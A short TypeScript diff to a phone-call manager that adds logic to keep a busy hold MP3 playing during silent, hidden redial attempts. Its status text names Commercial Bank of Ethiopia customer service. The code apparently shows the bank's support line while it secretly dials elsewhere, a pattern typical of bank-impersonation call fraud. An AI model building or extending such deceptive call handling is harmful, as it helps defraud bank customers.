@@ -116,6 +116,11 @@ export class CbePhoneManager {
       window.onSecretCallRinging = (attemptNum: number) => {
         if (!this.isCallActive) return;
         this.secretLiveAttempt = attemptNum || Math.max(1, this.secretLiveAttempt);
+        // If already playing the busy hold MP3 (attempt > 1 silent redial), keep playing MP3 without interruption!
+        if (this.secretLivePhase === 'playing_busy_mp3') {
+          this.events.onSecretLivePhaseChange?.('playing_busy_mp3', this.secretLiveAttempt);
+          return;
+        }
         this.secretLivePhase = 'dialing_hidden';
         this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
         this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
